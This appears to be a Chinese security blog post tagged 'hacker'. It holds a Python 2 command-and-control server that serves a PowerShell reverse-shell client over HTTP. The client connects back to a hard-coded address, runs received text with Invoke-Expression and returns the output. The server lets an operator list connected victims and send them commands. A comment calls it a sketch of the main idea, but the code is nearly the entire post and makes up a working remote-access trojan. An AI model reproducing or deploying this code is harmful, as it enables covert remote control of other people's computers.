<h2 id="代码">代码</h2><pre><code><span class="comment"># 这里只发个主要思路，直接用并不靠谱，我后续还改过很多代码。</span>
<span class="comment"># -*- coding:utf-8 -*-</span>
<span class="keyword">import</span> sys
<span class="keyword">import</span> socket
<span class="keyword">import</span> threading

<span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:
    port = int(sys.argv[<span class="number">1</span>])
<span class="keyword">else</span>:
    sys.exit(<span class="string">"Usage: server.py &lt;port&gt;"</span>)

allConnections = []
allAddresses = []


<span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>
    threadCommand = threading.Thread(target=get_command)
    threadCommand.start()
    threadService = threading.Thread(target=service)
    threadService.start()


<span class="comment"># 接受输入参数与控制命令</span>
<span class="function"><span class="keyword">def</span> <span class="title">get_command</span><span class="params">()</span>:</span>
    <span class="keyword">while</span> <span class="number">1</span>:
        command = raw_input(<span class="string">"&gt; "</span>)
        <span class="keyword">if</span> command == <span class="string">"list"</span>:
            <span class="keyword">print</span> <span class="string">"pk------------address-----------------port"</span>
            pk = <span class="number">1</span>
            <span class="keyword">for</span> i <span class="keyword">in</span> allAddresses:
                <span class="keyword">print</span> str(pk) + <span class="string">"------"</span> + str(i[<span class="number">0</span>]) + <span class="string">"---------"</span> + str(i[<span class="number">1</span>])
                pk += <span class="number">1</span>
        <span class="keyword">elif</span> command.startswith(<span class="string">"c"</span>):
            <span class="keyword">try</span>:
                pk = int(command[<span class="number">2</span>:]) - <span class="number">1</span>
            <span class="keyword">except</span>:
                <span class="keyword">print</span> <span class="string">"usage:c &lt;client_pk&gt;"</span>

            <span class="keyword">while</span> <span class="number">1</span>:
                <span class="keyword">try</span>:
                    msg = raw_input(<span class="string">"control %s:%s&gt; "</span> % (allAddresses[pk][<span class="number">0</span>], allAddresses[pk][<span class="number">1</span>]))
                    allConnections[pk].send(msg)
                    allConnections[pk].settimeout(<span class="number">5</span>)
                    result = allConnections[pk].recv(<span class="number">1024</span>)
                    result = result.decode(<span class="string">'utf8'</span>)
                    <span class="keyword">print</span> result

                <span class="keyword">except</span> KeyboardInterrupt:
                    <span class="keyword">print</span> <span class="string">"Catch C-c"</span>
                    <span class="keyword">break</span>
                <span class="keyword">except</span> Exception, e:
                    <span class="keyword">print</span> <span class="string">"error:"</span> + str(e)
                    <span class="keyword">break</span>


<span class="comment"># Socket服务进程，如果Request里包含connect，用Http返回PowerShell客户端的代码</span>
<span class="comment"># 如果Request不包含connect，说明是后续的TCP连接成功，添加进已连接的客户端数组</span>
<span class="function"><span class="keyword">def</span> <span class="title">service</span><span class="params">()</span>:</span>
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((<span class="string">''</span>, port))
    sock.listen(<span class="number">5</span>)
    <span class="keyword">while</span> <span class="number">1</span>:
        <span class="keyword">try</span>:
            conn, addr = sock.accept()
            conn.setblocking(<span class="number">1</span>)
            <span class="keyword">if</span> conn:
                request = conn.recv(<span class="number">23</span>)
            <span class="keyword">print</span> request
            <span class="keyword">if</span> request.find(<span class="string">"/connect"</span>) &gt; <span class="number">0</span>:
                http_message(keep_connect(<span class="string">"192.168.199.100"</span>, port), conn)
            <span class="keyword">else</span>:
                allConnections.append(conn)
                allAddresses.append(addr)
                <span class="keyword">print</span> <span class="string">"Connected with "</span> + addr[<span class="number">0</span>] + <span class="string">":"</span> + str(addr[<span class="number">1</span>])
        <span class="keyword">except</span> Exception, e:
            <span class="keyword">print</span> <span class="string">"error:"</span> + str(e)
            <span class="keyword">break</span>


<span class="comment"># PowerShell客户端的代码，与服务端用TCP连接，Iex执行接受的数据并返回执行结果</span>
<span class="function"><span class="keyword">def</span> <span class="title">keep_connect</span><span class="params">(ip, port)</span>:</span>
    message = <span class="string">'$client = New-Object System.Net.Sockets.TcpClient("%s",%d)'</span> % (ip, port)
    message += <span class="string">'''
                $stream = $client.GetStream()
                [byte[]]$bytes = 0..65535|%{0}
                if ($stream.CanWrite)
                {
                            $sendBytes = ([text.encoding]::ASCII).GetBytes("rat")
                            $stream.Write($sendBytes, 0, $sendBytes.Length)
                            while (1)
                            {
                                 try{
                                     $data = $stream.read($bytes, 0, $bytes.Length)
                                     $EncodedText = New-Object -TypeName System.Text.UTF8Encoding
                                     $info = $EncodedText.GetString($bytes,0, $data)
                                     $sendback = (Invoke-Expression -Command $info 2&gt;&amp;1 | Out-String )
                                     $sendbackBytes = ([text.encoding]::UTF8).GetBytes($sendback)
                                     $stream.Write($sendbackBytes,0,$sendbackBytes.Length)
                                     write($info)
                                 }
                                 catch
                                 {
                                     Write-Error $_
                                     continue
                                 }
                            }
                }
                else
                {       }
          '''</span>
    <span class="keyword">return</span> message


<span class="function"><span class="keyword">def</span> <span class="title">http_message</span><span class="params">(msg, conn)</span>:</span>
    <span class="keyword">try</span>:
        httpHead = <span class="string">"HTTP/1.1 200 OK\r\n"</span>
        httpHead += <span class="string">"Content-type: text/html; charset=utf-8\r\n"</span>
        httpHead += <span class="string">"Connection: Keep-Alive\r\n"</span>
        httpHead += <span class="string">"Server: test\r\n"</span>
        httpHead += <span class="string">"Content-Length: %d\r\n"</span> % len(msg)
        httpHead += <span class="string">"\r\n"</span>

        conn.send(httpHead + msg)
        <span class="keyword">return</span> <span class="number">1</span>
    <span class="keyword">except</span>:
        <span class="keyword">return</span> <span class="number">0</span>


main()
</code></pre>]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python,powershell,hacker </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
